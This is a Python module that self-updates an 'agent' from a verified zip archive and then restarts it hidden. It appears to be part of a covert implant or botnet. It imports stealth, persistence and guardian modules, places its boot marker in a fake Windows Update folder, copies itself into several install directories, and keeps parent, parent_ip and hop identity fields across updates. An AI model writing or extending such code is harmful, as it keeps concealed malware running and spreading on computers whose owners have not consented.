"""Self-update from a zip produced by :mod:`syspy.packaging`.

The flow is deliberately conservative:

1. verify the SHA-256 of the whole archive
2. extract into a staging directory
3. verify the per-file manifest
4. byte-compile every module
5. swap in the new tree, keeping ``.bak`` copies
6. start a fresh process and wait for its boot marker
7. roll back automatically if it does not report in
"""

from __future__ import annotations

import compileall
import hashlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import zipfile

from .. import packaging
from . import persistence, runtime, stealth

IS_WINDOWS = os.name == "nt"
CREATE_NEW_PROCESS_GROUP = 0x00000200 if IS_WINDOWS else 0
BOOT_MARK = os.path.join(os.environ.get("PROGRAMDATA") or tempfile.gettempdir(), "Microsoft", "WindowsUpdate", "boot")
PRESERVED_DEPLOY_KEYS = ("salt", "parent", "parent_ip", "hop", "group", "protected")


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _file_sha256(path: str) -> str:
    try:
        with open(path, "rb") as handle:
            return _sha256(handle.read())
    except OSError:
        return ""


def _remove(path: str) -> None:
    """Remove a file *or* a directory.

    ``shutil.rmtree`` on a plain file raises internally and, with
    ``ignore_errors=True``, leaves the file behind. That would make rollback
    silently do nothing for ``agent.py``.
    """
    if os.path.islink(path):
        try:
            os.remove(path)
        except OSError:
            pass
    elif os.path.isdir(path):
        shutil.rmtree(path, ignore_errors=True)
    elif os.path.exists(path):
        try:
            os.remove(path)
        except OSError:
            pass


def _preserve_identity(bundle_root: str) -> dict[str, object]:
    """Read per-agent deployment state before the update replaces the bundle."""
    path = os.path.join(bundle_root, "deploy.json")
    try:
        with open(path, "r", encoding="utf-8-sig") as handle:
            data = json.load(handle)
    except (OSError, ValueError):
        return {}
    if not isinstance(data, dict):
        return {}
    return {
        key: data[key]
        for key in PRESERVED_DEPLOY_KEYS
        if key in data
    }


def _restore_identity(bundle_root: str, preserved: dict[str, object]) -> None:
    if not preserved:
        return
    path = os.path.join(bundle_root, "deploy.json")
    try:
        with open(path, "r", encoding="utf-8-sig") as handle:
            merged = json.load(handle)
    except (OSError, ValueError):
        merged = {}
    if not isinstance(merged, dict):
        merged = {}
    merged.update(preserved)
    temporary = path + ".tmp"
    try:
        with open(temporary, "w", encoding="utf-8") as handle:
            json.dump(merged, handle, indent=1)
        os.replace(temporary, path)
    except OSError:
        _remove(temporary)
        raise


def _anchor_requires_elevation() -> bool:
    if not IS_WINDOWS or stealth.is_admin():
        return False
    directories = stealth.install_directories()
    return len(directories) >= 3 and os.path.isdir(directories[2])


def write_boot_marker() -> None:
    """Called by a freshly started agent so its parent knows it survived."""
    entry = os.path.join(stealth.bundle_root(), "agent.py")
    try:
        os.makedirs(os.path.dirname(BOOT_MARK), exist_ok=True)
        with open(BOOT_MARK, "w", encoding="ascii") as handle:
            handle.write(f"{os.getpid()}:{_file_sha256(entry)}")
    except OSError:
        pass


def apply(archive: bytes, expected_sha: str = "",
          restart: bool = True) -> tuple[bool, str]:
    """Apply an update archive.  Returns ``(ok, message)``."""
    digest = _sha256(archive)
    if expected_sha and digest != expected_sha:
        return False, "archive hash mismatch"
    if len(archive) < 256:
        return False, "archive suspiciously small"
    if _anchor_requires_elevation():
        return False, "administrator privileges required to update the anchor"

    root = stealth.bundle_root()
    preserved_identity = _preserve_identity(root)
    staging = os.path.join(stealth.primary_directory(), ".staging")
    _remove(staging)
    os.makedirs(staging, exist_ok=True)

    try:
        with zipfile.ZipFile(io.BytesIO(archive)) as bundle:
            bundle.extractall(staging)
    except zipfile.BadZipFile:
        return False, "not a valid zip archive"

    ok, reason = packaging.verify_manifest(staging)
    if not ok:
        return False, reason

    if not compileall.compile_dir(staging, quiet=2, force=True):
        return False, "compilation failed"

    try:
        _swap(staging, root)
    except OSError as error:
        return False, f"swap failed: {error}"

    try:
        _restore_identity(root, preserved_identity)
    except OSError as error:
        rollback()
        return False, f"could not preserve deployment identity: {error}"

    persistence.install_copies()

    try:
        from .. import guardian
        guardian.install()
    except Exception:
        pass

    if restart:
        restart_self()
    return True, digest[:12]


def _swap(staging: str, root: str) -> None:
    """Replace the live bundle with the staged one, keeping backups."""
    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
        live = os.path.join(root, relative)
        fresh = os.path.join(staging, relative)
        if not os.path.exists(fresh):
            continue
        _remove(live + ".bak")
        if os.path.exists(live):
            shutil.move(live, live + ".bak")
        shutil.move(fresh, live)

    for directory in stealth.install_directories():
        if os.path.abspath(directory) == os.path.abspath(root):
            continue
        for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
            source = os.path.join(root, relative)
            if not os.path.exists(source):
                continue
            target = os.path.join(directory, relative)
            _remove(target)
            if os.path.isdir(source):
                shutil.copytree(source, target,
                                ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
            else:
                shutil.copy2(source, target)


def rollback() -> int:
    """Restore ``.bak`` copies.  Returns how many items were restored."""
    root = stealth.bundle_root()
    restored = 0
    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
        backup = os.path.join(root, relative + ".bak")
        live = os.path.join(root, relative)
        if not os.path.exists(backup):
            continue
        _remove(live)
        shutil.move(backup, live)
        restored += 1
    return restored


def restart_self(path: str | None = None) -> None:
    """Launch a fresh copy, wait for it to report in, roll back on failure."""
    root = stealth.bundle_root()

    if path:
        target = path
    elif getattr(sys, "frozen", False):
        target = os.path.abspath(sys.executable)
    else:
        target = os.path.join(root, os.path.basename(sys.argv[0]) or "agent.py")
    if not os.path.exists(target):
        target = os.path.join(root, "agent.py")

    os.makedirs(os.path.dirname(BOOT_MARK), exist_ok=True)
    _remove(BOOT_MARK)

    if getattr(sys, "frozen", False) or target.lower().endswith(".exe"):
        command = [target]
    else:
        command = [runtime.interpreter(), target]
    command += ["--takeover", str(os.getpid()), "--hidden"]

    for attempt in range(3):
        try:
            process = subprocess.Popen(command, cwd=root, close_fds=True,
                                       creationflags=CREATE_NEW_PROCESS_GROUP)
        except OSError:
            os.execv(runtime.interpreter(),
                     [runtime.interpreter(), target, "--takeover", str(os.getpid())])
            return

        deadline = time.time() + 12
        while time.time() < deadline:
            time.sleep(0.25)
            if os.path.exists(BOOT_MARK):
                try:
                    with open(BOOT_MARK, "r", encoding="ascii") as handle:
                        if handle.read().startswith(str(process.pid)):
                            os._exit(0)
                except OSError:
                    pass
            if process.poll() is not None:
                break

        if attempt < 2 and rollback():
            continue
        break

    os._exit(0)